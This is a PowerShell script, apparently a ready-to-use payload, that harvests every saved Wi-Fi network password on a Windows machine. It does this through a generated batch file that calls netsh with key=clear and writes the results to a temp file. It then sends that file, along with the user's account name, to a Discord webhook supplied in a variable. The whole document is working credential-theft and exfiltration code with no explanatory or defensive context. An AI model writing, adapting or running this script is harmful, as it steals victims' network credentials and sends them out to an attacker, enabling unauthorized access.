'@echo off' | Out-File -Encoding ASCII -FilePath "$env:TMP/script.bat"
'for /f "skip=9 tokens=1,* delims=:" %%a in (''netsh wlan show profile'') do (' | Add-Content -Path "$env:TMP/script.bat"
'    if not "%%b"=="" (' | Add-Content -Path "$env:TMP/script.bat"
'        for /f "tokens=*" %%c in ("%%b") do (' | Add-Content -Path "$env:TMP/script.bat"
'            set "profileName=%%c"' | Add-Content -Path "$env:TMP/script.bat"
'            setlocal enabledelayedexpansion' | Add-Content -Path "$env:TMP/script.bat"
'            set "profileName=!profileName:~0!"' | Add-Content -Path "$env:TMP/script.bat"
'            netsh wlan show profile name="!profileName!" key=clear' | Add-Content -Path "$env:TMP/script.bat"
'            endlocal' | Add-Content -Path "$env:TMP/script.bat"
'        )' | Add-Content -Path "$env:TMP/script.bat"
'    )' | Add-Content -Path "$env:TMP/script.bat"
')' | Add-Content -Path "$env:TMP/script.bat"
cmd.exe /c "$env:TMP/script.bat > $env:TMP/ResultadoFinal.txt"

$FileName = "ResultadoFinal.txt"

function Upload-Discord {

[CmdletBinding()]
param (
    [parameter(Position=0,Mandatory=$False)]
    [string]$file,
    [parameter(Position=1,Mandatory=$False)]
    [string]$text 
)
$hookurl = "$dc"

$Body = @{
  'username' = $env:username
  'content' = $text
}

if (-not ([string]::IsNullOrEmpty($text))){
Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};

if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
}

if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file "$env:TMP/$FileName"}
